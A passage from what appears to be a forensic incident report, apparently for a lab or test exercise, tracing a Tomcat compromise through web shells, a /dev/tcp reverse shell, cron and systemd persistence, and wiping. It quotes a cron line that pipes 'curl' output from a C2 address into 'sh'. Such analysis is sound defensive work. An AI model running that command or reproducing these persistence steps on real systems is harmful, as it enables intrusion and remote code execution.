disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:2`.\n\n2. **Stage 2: Web Shell Placement (T1505.003)**\n   - **Primary Web Shell**: Placed at `/disk/var/lib/tomcat9/webapps/ROOT/static/status.jsp:1-2`. Alerted as `ALERT-01` in `/sas/alerts.json:2-9`.\n   - **Secondary Web Shell (SILENT)**: Placed at `/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:1-2` to maintain hidden backup web access. Un-alerted in `/sas/alerts.json`.\n\n3. **Stage 3: Execution & Reverse Shell (T1059.004)**\n   - The attacker spawned a reverse shell process invoking `bash -i` over `/dev/tcp` targeting C2 IP `198.51.100.136`.\n   - Artifact located at `/disk/tmp/.sysd:1-2`. Alerted as `ALERT-02` in `/sas/alerts.json:10-17`.\n\n4. **Stage 4: Cron Persistence (T1053.003) - SILENT**\n   - The adversary installed a cron file at `/disk/etc/cron.d/apache-cache:1-5`.\n   - The job runs every 15 minutes as user `nobody` (`/disk/etc/cron.d/apache-cache:4`) and includes an active root beacon execution comment line (`/disk/etc/cron.d/apache-cache:5` executing `curl hxxp://198.51.100.136/x | sh`).\n   - This item was completely absent from `/sas/alerts.json`.\n\n5. **Stage 5: Systemd Service Persistence (T1543.002)**\n   - The actor created a systemd service unit at `/disk/etc/systemd/system/apache-cache.service:1-7`.\n   - Disguised as "System Update Helper" (`/disk/etc/systemd/system/apache-cache.service:2`), the service launches a re-dropper payload (`/disk/etc/systemd/system/apache-cache.service:5`).\n   - Alerted as `ALERT-03` in `/sas/alerts.json:18-25`.\n\n6. **Stage 6: Stealth, Timestomping & Wiping (T1070.006) - SILENT**\n   - The secondary web shell (`/disk/var/lib/tomcat9/webapps/ROOT/static/.helper.jsp:1-2`) was hidden with dot-prefix naming.\n   - Attacker tools and C2 binaries were wiped, leaving residual recovered artifact at `/disk/var/lib/.cache/.wiped.bin:1`.\n   - Timestomping activities occurred as documented in `/sas/cti/advisory.txt:16`.\n\n## Complete ATT&CK Technique & Find